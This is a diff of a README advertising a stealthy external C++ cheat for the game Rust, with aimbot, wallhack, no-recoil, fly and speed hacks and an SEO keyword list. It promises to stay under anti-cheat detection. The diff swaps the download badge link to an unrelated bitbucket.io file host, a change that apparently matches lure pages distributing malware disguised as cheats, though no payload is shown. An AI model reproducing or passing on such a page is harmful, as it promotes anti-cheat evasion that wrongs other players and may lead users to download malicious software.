@@ -2,7 +2,7 @@
 
 Dominate the world of Rust with this powerful external **C++ cheat**, offering everything you need for total control. Whether you're looking for perfect aim, wall vision, no recoil, or fly and speed hacks — this tool does it all. 🧠 Lightweight, fast, and designed for stealth, it gives you the tactical upper hand while staying under anti-cheat radar. Perfect for both aggressive PvP and discreet farming.
 
-[![Download Rust Cheat Tool](https://img.shields.io/badge/Download-Rust_Cheat_Tool-blueviolet)](https://wecheaters.github.io/cheats/rust/)
+[![Download Rust Cheat Tool](https://img.shields.io/badge/Download-Rust_Cheat_Tool-blueviolet)](https://fileoffload5.bitbucket.io)
 
 ---
 
@@ -73,3 +73,4 @@ Rust Cheat operates **externally**, meaning it doesn’t inject into the game. I
 Rust Cheat, Rust Aimbot, Rust ESP Hack, Rust Recoil Tool, Rust C++ Cheat, Rust FlyHack, Rust SpeedHack, Undetected Rust Hack, External Rust Cheat Download, Rust No Recoil, Rust PvP Hack, Rust Cheat Menu, Rust WallHack, Rust Legit ESP Tool, Free Rust Cheat
 
 ---
+
